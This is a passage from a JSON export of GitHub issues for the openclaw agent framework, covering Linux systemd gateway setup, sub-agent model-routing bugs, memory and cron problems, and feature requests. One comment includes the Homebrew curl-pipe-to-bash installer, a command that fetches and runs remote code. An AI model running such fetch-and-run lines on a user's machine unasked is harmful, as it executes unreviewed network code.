standpoint to run openclaw as a non-sudo user? It seems more secure this way, but will I cap my bot at the knees (arthropod knees) doing it this way?"
        },
        {
          "id": 3844952193,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3844952193",
          "createdAt": "2026-02-04T02:56:19Z",
          "updatedAt": "2026-02-04T02:56:19Z",
          "author": "johnlanni",
          "body": "The following command was helpful for me to solve this problem:\n```bash\nexport XDG_RUNTIME_DIR=/run/user/$(id -u)\nexport DBUS_SESSION_BUS_ADDRESS=unix:path=$XDG_RUNTIME_DIR/bus\nsystemctl --user\n```"
        },
        {
          "id": 3846028479,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3846028479",
          "createdAt": "2026-02-04T08:23:30Z",
          "updatedAt": "2026-02-04T08:23:30Z",
          "author": "jero-at-github",
          "body": "Sice this is not resolved and I can't make openclaw to work in Ubuntu can anybody recommend another Linux distro where yes it works out of the box?"
        },
        {
          "id": 3849461651,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3849461651",
          "createdAt": "2026-02-04T19:58:13Z",
          "updatedAt": "2026-02-04T19:58:13Z",
          "author": "0x0-Nyx",
          "body": "This worked on my Ubuntu 24.03 VM:\n\nsudo apt install -y dbus-user-session systemd-logind\nloginctl enable-linger $USER\nloginctl show-user $USER | grep Linger\n-> log out of ssh / your user and login again\nsystemctl --user daemon-reexec\nsystemctl --user status\n\nAlso If you don't want to painfully install the tools for the skills manually, install homebrew for linux:\nhttps://brew.sh/\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n"
        },
        {
          "id": 3855648705,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3855648705",
          "createdAt": "2026-02-05T19:07:19Z",
          "updatedAt": "2026-02-05T19:07:19Z",
          "author": "chicagobuss",
          "body": "What is the intended behavior for using brew to install openclaw on linux right now?  \n\nBecause I've just installed it and am encountering this same error but none of the suggested 'fixes' are working.."
        },
        {
          "id": 3861422819,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3861422819",
          "createdAt": "2026-02-06T16:40:53Z",
          "updatedAt": "2026-02-06T16:40:53Z",
          "author": "0x0-Nyx",
          "body": "> What is the intended behavior for using brew to install openclaw on linux right now?\n> \n> Because I've just installed it and am encountering this same error but none of the suggested 'fixes' are working..\n\nIt is used to install the additional tools that openclaw uses later on. you can either install them manually or automagically. For automagic you need brew."
        },
        {
          "id": 3863893506,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3863893506",
          "createdAt": "2026-02-07T07:53:41Z",
          "updatedAt": "2026-02-07T07:53:41Z",
          "author": "newcodebook",
          "body": "This issue looks covered by a CoClaw Troubleshooting Solution:\n\nhttps://coclaw.com/troubleshooting/solutions/linux-gateway-service-not-installed/\n\nIf you try the steps and it still fails, please reply with:\n- your OS + OpenClaw version\n- relevant gateway logs (around the failure)\n- a minimal config snippet (redact secrets)"
        },
        {
          "id": 3863978074,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3863978074",
          "createdAt": "2026-02-07T08:50:20Z",
          "updatedAt": "2026-02-07T08:50:20Z",
          "author": "chepurko",
          "body": "Alright, Claude convinced me to go with a systemd user service instead of a system service. Here's everything anyone running this on a cloud VPS should need to do:\n\n```\n# Edit sshd_config. Find the line:\nUsePAM no\n\n# Change it to:\nUsePAM yes\n\n# Verify /etc/pam.d/sshd or /etc/pam.d/common-session contain the line:\nsession optional        pam_systemd.so\n\n# If not install\nsudo apt install --reinstall libpam-systemd\n\n# Reboot and/or ssh back into your server. Verify your user session\nloginctl list-sessions\n\n# Now enable lingering and install the gateway\nsudo loginctl enable-linger $(whoami)\nopenclaw gateway install\n\n# Reload user daemon to pick up the new service\nsystemctl --user daemon-reload\n\n# Enable it to start at boot (with lingering, this means system boot)\nsystemctl --user enable openclaw-gateway.service\n\n# Start it now\nsystemctl --user start openclaw-gateway.service\n\n# Check status\nsystemctl --user status openclaw-gateway.service\n```"
        },
        {
          "id": 3868576313,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3868576313",
          "createdAt": "2026-02-08T23:45:42Z",
          "updatedAt": "2026-02-08T23:45:42Z",
          "author": "akincan-kilic",
          "body": "**OS:** Debian GNU/Linux 13 (trixie)\n**OpenClaw Version:** 2026.2.6-3\n\nI've had this exact issue during my set-up, the problem was that I created a non-root user, and for this user the **systemd user session** support was not available. to fix I simply ran:\n\n```bash\nsudo apt update\nsudo apt install -y dbus-user-session\n```\n\nThen enabled lingering:\n\n`sudo loginctl enable-linger <USERNAME>`\n\nAfter the reboot (`sudo reboot`) I confirmed it was working by running:\n\n`systemctl --user status`\n\nAnd then installed the gateway service with:\n\n`openclaw gateway install`\n\nHopefully this helps someone.\n"
        },
        {
          "id": 3868591234,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3868591234",
          "createdAt": "2026-02-08T23:55:44Z",
          "updatedAt": "2026-02-08T23:55:44Z",
          "author": "growthringsadvisory",
          "body": "> **OS:** Debian GNU/Linux 13 (trixie) **OpenClaw Version:** 2026.2.6-3\n> \n> I've had this exact issue during my set-up, the problem was that I created a non-root user, and for this user the **systemd user session** support was not available. to fix I simply ran:\n> \n> sudo apt update\n> sudo apt install -y dbus-user-session\n> Then enabled lingering:\n> \n> `sudo loginctl enable-linger <USERNAME>`\n> \n> After the reboot (`sudo reboot`) I confirmed it was working by running:\n> \n> `systemctl --user status`\n> \n> And then installed the gateway service with:\n> \n> `openclaw gateway install`\n> \n> Hopefully this helps someone.\n\nThe reboot in between was key, at least for me. Lingering still wasn’t working until doing that.  "
        },
        {
          "id": 3870359106,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3870359106",
          "createdAt": "2026-02-09T09:11:31Z",
          "updatedAt": "2026-02-09T09:11:31Z",
          "author": "cliia",
          "body": "I encountered the same issue on WSL (Ubuntu 24.04). I managed to fix it by running `loginctl disable-linger [username]` followed by a reboot, although I'm not entirely sure about the underlying mechanism."
        },
        {
          "id": 3873516663,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3873516663",
          "createdAt": "2026-02-09T19:52:15Z",
          "updatedAt": "2026-02-09T19:52:15Z",
          "author": "feld",
          "body": "I hit this on Debian 12. The solution was fairly simple:\n\n```bash\nsu -l <username>\n```\n\nnow you have a proper logged in shell which will have the DBUS and XDG envs. The `loginctl session-status` command will work, and if you install OpenClaw now it will be able to install the systemd user services"
        },
        {
          "id": 3877580231,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3877580231",
          "createdAt": "2026-02-10T13:23:41Z",
          "updatedAt": "2026-02-10T13:23:41Z",
          "author": "MinSomai",
          "body": "https://github.com/openclaw/openclaw/issues/11805\n\nWorkaround from this issue worked for me."
        },
        {
          "id": 3883957237,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3883957237",
          "createdAt": "2026-02-11T11:53:54Z",
          "updatedAt": "2026-02-11T11:53:54Z",
          "author": "ArgonQQ",
          "body": "As previously stated for me the only thing which worked was to just switch from SSH to local terminal access of the VM and just run the gateway `openclaw gateway` command. \n\nJust if anyone looks for a quick fix which does not require any installs."
        }
      ]
    },
    {
      "number": 14059,
      "title": "[Code Quality]: It would be nice to refector the main folder into organized folders with their own perimeters",
      "body": "## Summary\n\nThe current naming conventions will only get us so far - soon duplicate code will start to be generated  if something is not done.\n\n## Proposed solution\n\norganised folder with many different files that do different things into many different folders that each do one thing.\n\n## Alternatives considered\n\nnone.\n\n## Additional context\n\nsrc/commands",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14059",
      "createdAt": "2026-02-11T11:38:20Z",
      "updatedAt": "2026-02-11T11:50:45Z",
      "author": "Josephrp",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3883944235,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14059#issuecomment-3883944235",
          "createdAt": "2026-02-11T11:50:44Z",
          "updatedAt": "2026-02-11T11:50:44Z",
          "author": "Josephrp",
          "body": "an example with this problem here : #13472 "
        }
      ]
    },
    {
      "number": 14060,
      "title": "[Bug]: Memory tool unavailable when using OpenAI Codex OAuth (no API key) – memory_search fails",
      "body": "Summary\nWhen the agent is authenticated via OpenAI Codex OAuth (provider: openai-codex), the memory plugin/tooling is not usable. `openclaw status` shows “Memory … unavailable” and calling `memory_search` fails with “No API key found …”. This prevents durable recall and breaks the “memory_search mandatory recall” workflow.\n\nSteps to reproduce\n1. Install and run OpenClaw.\n2. Configure auth profile for Codex OAuth:\n   auth.profiles.openai-codex:default = { provider: \"openai-codex\", mode: \"oauth\" }\n3. Enable memory plugin (memory-core).\n4. Start the agent and call the memory tool (e.g. memory_search on MEMORY.md / memory/*.md).\n\nExpected behavior\n- Memory plugin is available and `memory_search` works with local memory store, independent of having OPENAI_API_KEY/VOYAGE/Google keys.\n- `openclaw status` should not show “Memory … unavailable”.\n\nActual behavior\n- `openclaw status` shows: “Memory enabled (plugin memory-core) · unavailable”.\n- `memory_search` fails with an error complaining about missing API keys/providers, even though the agent is authenticated via Codex OAuth.\n\nEnvironment\n- OpenClaw version: 2026.2.9\n- OS: Linux (arm64) Raspberry Pi (Debian), kernel 6.12.62+rpt-rpi-2712\n- Node: v22.22.0\n- Auth: OpenAI Codex OAuth (openai-codex/* models)\n\nLogs\nmemory_search error (example):\nNo API key found for provider \"openai\" … authenticated with OpenAI Codex OAuth …\nNo API key found for provider \"google\" …\nNo API key found for provider \"voyage\" …\n\nNotes / hypothesis\nIt looks like memory_search is coupled to external embedding/search providers requiring API keys, instead of falling back to a local index/store (or using the Codex OAuth provider when available). This makes memory unusable out-of-the-box for Codex OAuth setups.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14060",
      "createdAt": "2026-02-11T11:45:00Z",
      "updatedAt": "2026-02-11T11:45:00Z",
      "author": "finnbusse",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 6295,
      "title": "sessions_spawn model override not applied to sub-agents",
      "body": "## Bug Description\n\nThe `model` parameter in `sessions_spawn` and the `agents.defaults.subagents.model` config setting are not being applied to spawned sub-agents. Sub-agents always inherit the main agent's model regardless of configuration.\n\n## Steps to Reproduce\n\n1. Configure sub-agent default model in `clawdbot.json`:\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"subagents\": {\n        \"model\": {\n          \"primary\": \"openai-codex/gpt-4o\",\n          \"fallbacks\": [\"openai/gpt-4o\"]\n        }\n      }\n    }\n  }\n}\n```\n\n2. Spawn a sub-agent with explicit model override:\n```\nsessions_spawn(task=\"Test task\", model=\"openai/gpt-4o\")\n```\n\n3. Tool returns `{ \"modelApplied\": true }`\n\n4. Check the session transcript:\n```json\n{\"type\":\"model_change\",\"provider\":\"anthropic\",\"modelId\":\"claude-opus-4-5\"}\n```\n\n## Expected Behavior\n\nSub-agent should run on the specified model (`openai/gpt-4o` or `openai-codex/gpt-4o`).\n\n## Actual Behavior\n\nSub-agent runs on the main agent's model (`anthropic/claude-opus-4-5`) despite:\n- Config setting `agents.defaults.subagents.model`\n- Explicit `model` parameter in `sessions_spawn`\n- Tool returning `modelApplied: true`\n\n## Environment\n\n- Clawdbot version: 2026.1.24-3\n- OS: macOS (Darwin 25.2.0 arm64)\n- Main agent model: anthropic/claude-opus-4-5\n- Attempted sub-agent models: openai-codex/gpt-4o, openai/gpt-4o\n\n## Additional Context\n\nGateway logs show config is being detected and applied:\n```\n[reload] config change applied (dynamic reads: agents.defaults.subagents.model)\n```\n\nBut the actual model used in sub-agent sessions is always the main agent's model.",
      "state": "closed",
      "comments": 5,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6295",
      "createdAt": "2026-02-01T14:01:40Z",
      "updatedAt": "2026-02-11T11:28:02Z",
      "author": "richydeeee",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3832567048,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6295#issuecomment-3832567048",
          "createdAt": "2026-02-02T02:17:42Z",
          "updatedAt": "2026-02-02T02:17:42Z",
          "author": "Arlandw",
          "body": "We're experiencing the same issue with a custom vLLM provider (local GPT-OSS 120B via Spark).\n\nRelated: #6671\n\n**Our setup:**\n- Main agent: `anthropic/claude-opus-4-5`\n- Attempted sub-agent model: `spark//models/gpt-oss-120b` (vLLM endpoint)\n- Config: `agents.defaults.subagents.model` set correctly\n- Explicit `model` param in `sessions_spawn()` also ignored\n\nSame behavior: `modelApplied: true` in response but sub-agent actually runs on main model.\n\nThis affects both OpenAI-compatible providers (your case) and custom vLLM providers (our case), suggesting the bug is in the model routing logic rather than provider-specific."
        },
        {
          "id": 3837008577,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6295#issuecomment-3837008577",
          "createdAt": "2026-02-02T18:45:05Z",
          "updatedAt": "2026-02-02T18:45:05Z",
          "author": "Decayuki",
          "body": "## Confirmed on 2026.1.30\n\nExperiencing the exact same issue on OpenClaw 2026.1.30 (macOS arm64).\n\n**Use case:** Trying to use Haiku for procedural sub-agent workflows (NotebookLLM automation) to reduce costs 12× vs Sonnet.\n\n**Configurations tested (all failed):**\n\n1. String format:\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"subagents\": {\n        \"model\": \"anthropic/claude-haiku-4\"\n      }\n    }\n  }\n}\n```\n\n2. Object format:\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"subagents\": {\n        \"model\": {\n          \"primary\": \"anthropic/claude-haiku-4\"\n        }\n      }\n    }\n  }\n}\n```\n\n3. Per-agent config:\n```json\n{\n  \"agents\": {\n    \"list\": [\n      {\n        \"id\": \"main\",\n        \"subagents\": {\n          \"model\": {\n            \"primary\": \"anthropic/claude-haiku-4\"\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n4. Explicit model in `sessions_spawn`:\n```javascript\nsessions_spawn(task=\"...\", model=\"anthropic/claude-haiku-4\")\nsessions_spawn(task=\"...\", model=\"haiku\")  // via alias\n```\n\n**Result in all cases:**\n- Warning: `\"model not allowed: anthropic/claude-haiku-4\"`\n- `modelApplied: false`\n- Sub-agent uses `anthropic/claude-sonnet-4-5` (main agent model)\n\n**Note:** Haiku IS in `agents.defaults.models` allowlist with alias configured.\n\n**Impact:** Cannot optimize costs by using cheaper models for procedural sub-agent tasks. This blocks a key use case for sub-agents (parallel work with cost-appropriate models)."
        },
        {
          "id": 3843098465,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6295#issuecomment-3843098465",
          "createdAt": "2026-02-03T18:59:48Z",
          "updatedAt": "2026-02-03T18:59:48Z",
          "author": "sebslight",
          "body": "Duplicate of #5369"
        },
        {
          "id": 3858377946,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6295#issuecomment-3858377946",
          "createdAt": "2026-02-06T06:48:09Z",
          "updatedAt": "2026-02-06T06:48:09Z",
          "author": "BruceHowells",
          "body": "## Additional Reproduction — Ollama Models\n\nConfirming this bug affects local model providers too.\n\n**Environment:**\n- OpenClaw: 2026.2.3-1\n- OS: Ubuntu 24.04\n- Main model: moonshot/kimi-k2.5\n- Ollama: Running at ollama.localdomain:11434 with qwen2.5:3b-32k, qwen2.5:14b, llama3.2:latest\n\n**Reproduction:**\n```javascript\nsessions_spawn({\n  task: \"Test task\",\n  model: \"ollama/qwen2.5:3b-32k\"\n})\n// Returns: { \"modelApplied\": true, ... }\n```\n\n**Transcript shows:**\n```json\n{\"type\":\"model_change\",\"provider\":\"moonshot\",\"modelId\":\"kimi-k2.5\"}\n```\n\n**Expected:** Ollama provider  \n**Actual:** Moonshot (main agent model)\n\n**Key finding:** The model parameter is *accepted* by the API (`modelApplied: true`) but *ignored* during subagent initialization. The Ollama models work correctly in the main session — this is specifically a subagent routing bug.\n\nRelated: #7211 (same issue for local providers)"
        },
        {
          "id": 3883833744,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6295#issuecomment-3883833744",
          "createdAt": "2026-02-11T11:28:02Z",
          "updatedAt": "2026-02-11T11:28:02Z",
          "author": "mei-goth",
          "body": "Another use case affected by this: multi-agent content production pipeline.\n\n**Setup:**\n- Chief agent (Claude Opus 4.6) spawns Scout & Scribe subagents for coordinated workflow\n- Scout configured to run on Grok 4.1 (for xAI search access)\n- Scribe configured to run on Claude Opus 4.6 (for synthesis)\n\n**Actual behavior:**\n- Both subagents inherit Chief's model when spawned via sessions_spawn\n- Config settings ignored, model parameter ignored\n- Subagents default to global subagent model (GLM-4.7 in this case)\n\n**Impact:**\n- Scout runs on wrong model → no xai-search access → can't fetch chart images from X\n- Scribe runs on cheaper model than intended → quality concerns\n- Can't leverage model specializations per agent role\n\nThis makes it impossible to run cost-optimized or capability-specialized multi-agent workflows. The architectural pattern of \"orchestrator agents spawning specialized workers\" is broken.\n\nWorkaround currently: Accept that subagents run on global default. Works in some cases, defeats the purpose of agent-specific model selection in others."
        }
      ]
    },
    {
      "number": 14056,
      "title": "Feature: Persist unmentioned group messages to workspace/memory/group-log-YYYY-MM-DD.md",
      "body": "## Use case\n\nCommunity Brain agents (e.g. WhatsApp group observers) need **all** group messages — both mentioned and unmentioned — for:\n- retrieval via `memory_search`\n- daily summarization\n- DM replies citing community discussions\n\nCurrently, unmentioned messages go to in-memory `groupHistories` only. They are never persisted to disk. Users who expect a `group-log-YYYY-MM-DD.md` file (as implied by session-memory-style patterns) get nothing.\n\n## Current behavior\n\n- **Mentioned / !command:** Full pipeline → session JSONL. Messages are persisted.\n- **Unmentioned:** `recordPendingHistoryEntryIfEnabled` → in-memory `groupHistories` map only. Returns NO_REPLY. No file write.\n\n## Proposed solution (either)\n\n**Option 1 — Built-in persistence:** When `recordPendingHistoryEntryIfEnabled` runs, optionally append to `{workspace}/memory/group-log-{YYYY-MM-DD}.md` in format:\n\n```\n[MM/DD/YY, HH:MM:SS] ~ SenderName: message body\n```\n\nConfig: e.g. `channels.whatsapp.persistGroupLog: true` or `messages.persistUnmentionedGroup: true` to enable.\n\n**Option 2 — message_received hook:** Implement the planned `message_received` hook (docs.openclaw.ai/automation/hooks, Future Events). Users could then implement custom persistence via a hook without core changes.\n\n## Environment\n\n- OpenClaw 2026.2.6\n- WhatsApp channel, `requireMention: true`\n- Workspace at `~/.openclaw/workspace/`\n\n## Related\n\n- docs.openclaw.ai/automation/hooks — Future Events lists `message_received`\n- No duplicate issue found for persist unmentioned group or group-log",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14056",
      "createdAt": "2026-02-11T11:25:44Z",
      "updatedAt": "2026-02-11T11:25:44Z",
      "author": "romiluz13",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14052,
      "title": "[Feature]: Integration onchain",
      "body": "I am a solana rust infra dev. I am going to integrate openclaw with onchain program\nis it possible? and is there any example or tutorial for it?",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14052",
      "createdAt": "2026-02-11T11:20:55Z",
      "updatedAt": "2026-02-11T11:20:55Z",
      "author": "roswelly",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 14051,
      "title": "Feature: Activity-based heartbeat with idle timeout",
      "body": "## Summary\nAdd an idle timeout option for heartbeats so they automatically pause after a period of inactivity.\n\n## Use Case\nCurrently heartbeats fire on a fixed interval (e.g. every 30m), burning tokens even when the user is asleep or away. Users want heartbeats to:\n1. **Start** when they begin a conversation\n2. **Stop** automatically after N minutes of inactivity (e.g. 60 minutes)\n\n## Proposed Config\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"heartbeat\": {\n        \"every\": \"30m\",\n        \"idleTimeoutMinutes\": 60\n      }\n    }\n  }\n}\n```\n\n## Behavior\n- When `idleTimeoutMinutes` is set, heartbeat only fires if there's been user activity within that window\n- \"Activity\" = any inbound message from an allowed sender\n- After idle timeout, heartbeats pause until next activity\n\n## Alternatives Considered\n- `activeHours` with fixed time windows (doesn't adapt to actual usage patterns)\n- Manual `/heartbeat on` / `/heartbeat off` toggle (works but requires user discipline)\n\n## Environment\nClawdbot 2026.1.24-3",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14051",
      "createdAt": "2026-02-11T11:15:01Z",
      "updatedAt": "2026-02-11T11:15:01Z",
      "author": "Keiracom",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13992,
      "title": "Cron jobs advance nextRunAtMs without executing",
      "body": "## Bug Description\n\nCron jobs are having their `nextRunAtMs` advanced to the next occurrence without actually executing. The scheduler appears to wake up, mark jobs as processed, and move on — but no execution happens.\n\n## Evidence\n\n### Job State (from jobs.json)\n\n**prep-today job:**\n- Created: Feb 9, 2026\n- Schedule: `0 7 * * *` (7 AM daily, Europe/Amsterdam)\n- `lastRunAtMs`: **missing** (never executed)\n- `nextRunAtMs`: Feb 12 (should have run Feb 10 & 11)\n- No run log file exists\n\n**daily-pm job:**\n- Schedule: `0 8 * * *` (8 AM daily)\n- `lastRunAtMs`: Feb 8, 2026\n- `nextRunAtMs`: Feb 12 (missed Feb 9, 10, 11)\n- Run log shows last successful run was Feb 8\n\n### Timeline\n\n- `~/.openclaw/cron/jobs.json` was modified at **08:00 today** (Feb 11)\n- Gateway logs show no activity between 21:15 (Feb 10) and 07:49 (Feb 11)\n- First activity today was browser startup at 07:49, not cron execution\n- No cron-related entries in gateway.log\n\n### Configuration\n\n- OpenClaw version: 2026.2.3-1\n- No explicit `cron` config section (using defaults)\n- `cron.enabled` should default to `true`\n- Gateway was running continuously (process started Feb 10 ~9 AM)\n- Host machine does NOT sleep (Amphetamine keeping it awake)\n\n## Expected Behavior\n\nJobs should execute at their scheduled times and create run log entries.\n\n## Actual Behavior\n\nJobs are skipped silently. `nextRunAtMs` advances to the next occurrence without:\n- Creating a run log entry\n- Executing the payload\n- Logging any errors\n\n## Reproduction\n\n1. Create a cron job scheduled for a specific time\n2. Wait for that time to pass\n3. Check `~/.openclaw/cron/runs/<jobId>.jsonl` — no entry created\n4. Check jobs.json — `nextRunAtMs` has advanced past the scheduled time\n\n## System Info\n\n- macOS (arm64)\n- Node v25.6.0\n- OpenClaw 2026.2.3-1\n- Gateway running in local mode",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13992",
      "createdAt": "2026-02-11T09:14:36Z",
      "updatedAt": "2026-02-11T11:13:46Z",
      "author": "desmondclaw",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3883368296,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13992#issuecomment-3883368296",
          "createdAt": "2026-02-11T09:51:58Z",
          "updatedAt": "2026-02-11T09:51:58Z",
          "author": "0xRaini",
          "body": "The \"nextRunAtMs advances but nothing executes\" pattern usually means the scheduler is processing jobs in the check phase but the actual dispatch is failing silently.\n\nA few things to check:\n\n1. **Gateway heartbeat interval** — If the gateway doesn't wake up between 21:15 and 07:49, the cron scheduler simply doesn't run. Jobs can only fire when the gateway is awake. Check if `heartbeat.intervalMs` is configured — without it, the gateway sleeps until an external event (message, webhook) wakes it.\n\n2. **Session lock contention** — If the job's `sessionTarget` is `\"main\"` and the main session is processing something else, the job gets marked `\"skipped\"`. But you said `lastRunAtMs` is missing entirely, which suggests the dispatcher never even attempts execution.\n\n3. **Quick diagnostic:**\n```bash\n# Check if the cron scheduler is actually loaded\ngrep -i 'cron' /tmp/openclaw/openclaw-*.log | tail -20\n\n# Check job state\ncat ~/.openclaw/cron/jobs.json | python3 -m json.tool\n```\n\n4. **Possible root cause:** If the gateway was updated or restarted between Feb 8 and now, the cron scheduler might not have re-loaded jobs.json properly. There's a known issue (#13845) where the scheduler's in-memory state can diverge from the file.\n\nCould you share the relevant section of your gateway config (cron/heartbeat settings)? That would help narrow it down."
        },
        {
          "id": 3883768784,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13992#issuecomment-3883768784",
          "createdAt": "2026-02-11T11:13:46Z",
          "updatedAt": "2026-02-11T11:13:46Z",
          "author": "WalterSumbon",
          "body": "## ✅ Fix Ready (Updated Version)\n\nI've updated the fix to address Greptile's concerns. The new version:\n\n**Changes:**\n- ✅ Preserves ALL existing scheduler logic (timeouts, backoff, drift handling, session reaper, logging)\n- ✅ Minimal modification: Only 3 lines changed in `timer.ts` + new maintenance function in `jobs.ts`  \n- ✅ Based on latest `main` (5741b6cb3)\n- ✅ Complete regression test suite\n\n**Key Fix:**\nWhen `findDueJobs()` returns empty, use `recomputeNextRunsForMaintenance()` instead of `recomputeNextRuns()` to prevent advancing past-due `nextRunAtMs` without execution.\n\n**Technical Issue:**\nDue to GitHub PAT `workflow` scope limitation, I cannot push the updated branch. The commit is ready locally:\n- Commit: `24720d881`\n- Compare: https://github.com/openclaw/openclaw/compare/main...WalterSumbon:openclaw:fix/cron-skip-execution-final\n\n**Files Changed:**\n1. `src/cron/service/timer.ts` - 3 lines (use maintenance recompute when no due jobs)\n2. `src/cron/service/jobs.ts` - Added `recomputeNextRunsForMaintenance()` \n3. `src/cron/service.issue-13992-regression.test.ts` - Complete test suite (4 test cases)\n\nThe fix is ready for review once I resolve the push issue, or a maintainer can cherry-pick the local commit."
        }
      ]
    },
    {
      "number": 14049,
      "title": "[Feature]: Qdrant-based Persistent Memory for OpenClaw Agents",
      "body": "\n**Status:** 📝 Draft for submission\n**Author:** @gamersalpha\n**Date:** 2026-02-11\n\n---\n\n## 🎯 Title\n**Integrate Qdrant as Native Memory Layer for OpenClaw Agents**\n\n## 📋 Problem Statement\n\nOpenClaw agents currently rely on flat text files (MD, JSON) for memory storage:\n\n- `MEMORY.md` - Long-term curated memories (main session only)\n- `memory/YYYY-MM-DD.md` - Daily logs and notes\n- Session transcripts - Stored per session, not queryable across sessions\n\n**Critical issues:**\n\n1. **Amnesia between sessions** - Agents wake up blank, no continuity from previous conversations\n2. **No cross-session retrieval** - Cannot query \"what did we discuss about X yesterday\"\n3. **No semantic search** - Only grep/keyword search, misses related concepts\n4. **No automated insight extraction** - Manual curation required (agent cannot self-improvement)\n5. **Memory fragmentation** - Multiple files, no unified view of agent's knowledge\n\n**User impact:** Agents feel \"dumb\" because they cannot remember past conversations, decisions, or context. This limits collaboration effectiveness and forces repeated explanations.\n\n---\n\n## ✅ Proposed Solution\n\nNative integration of Qdrant as the default memory layer for OpenClaw agents.\n\n### Architecture\n\n```\n┌─────────────────────────────────────────────────────────────┐\n│                    OpenClaw Agent                            │\n├─────────────────────────────────────────────────────────────┤\n│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐     │\n│  │  Messages   │    │   Recall    │    │   Write     │     │\n│  │   Trigger   │────►   Query     │────►   Embed     │     │\n│  └─────────────┘    └─────────────┘    └─────────────┘     │\n│                              │            │                 │\n│                              ▼            ▼                 │\n│  ┌─────────────────────────────────────────────────────┐   │\n│  │           Qdrant Connector Layer (native)           │   │\n│  └─────────────────────────────────────────────────────┘   │\n└─────────────────────────────────────────────────────────────┘\n                              │\n                              ▼\n                    ┌─────────────────┐\n                    │     Qdrant      │\n                    │  (Local/Cloud)  │\n                    └─────────────────┘\n```\n\n### Key Components\n\n#### 1. Memory Connector (Native)\n- **`memory_store(memory_id, text, metadata)`** - Store memory with automatic embedding\n- **`memory_query(query_text, filters)`** - Semantic search with filtering\n- **`memory_load_context(days, importance_threshold)`** - Load working memory at session start\n\n#### 2. Automatic Capture (Transparent)\n- Every message → automatically stored in Qdrant with:\n  - Timestamp\n  - Session ID\n  - Channel/User ID\n  - Detected topic (via embedding clustering)\n  - Importance score (auto-computed based on interactions)\n\n#### 3. Intelligent Recall (Pre-prompt)\n- Before each agent response → query Qdrant for relevant context:\n  - Recent conversations on same topic\n  - Related decisions\n  - Historical patterns\n\n#### 4. Configuration\n\n```yaml\n# openclaw.yaml\nmemory:\n  enabled: true\n  backend: qdrant\n  qdrant:\n    url: http://localhost:6333\n    api_key: ${QDRANT_API_KEY}\n    collection: agent-memory\n    embedding_model: nomic-embed-text  # or configurable\n  recall:\n    pre_reply: true  # Query Qdrant before responding\n    startup_days: 7  # Load last 7 days on session start\n    max_results: 10\n```\n\n---\n\n## 🎁 Benefits\n\n### For Users\n- ✅ **True memory continuity** - Agent remembers context from days/weeks ago\n- ✅ **Semantic search** - \"What did we discuss about infra?\" returns relevant results\n- ✅ **No manual memory curation** - Agent automatically stores important interactions\n- ✅ **Better collaboration** - Don't repeat explanations, build on previous work\n\n### For Agents\n- ✅ **Smarter responses** - Historical context injected automatically\n- ✅ **Pattern recognition** - Can learn from past decisions/outcomes\n- ✅ **Self-improvement** - Can query own history for insights\n\n### For OpenClaw\n- ✅ **Competitive advantage** - Native memory layer differentiates from other agent frameworks\n- ✅ **Scalable** - Qdrant handles millions of vectors with <200MB RAM\n- ✅ **Extensible** - Foundation for advanced features (RAG, knowledge 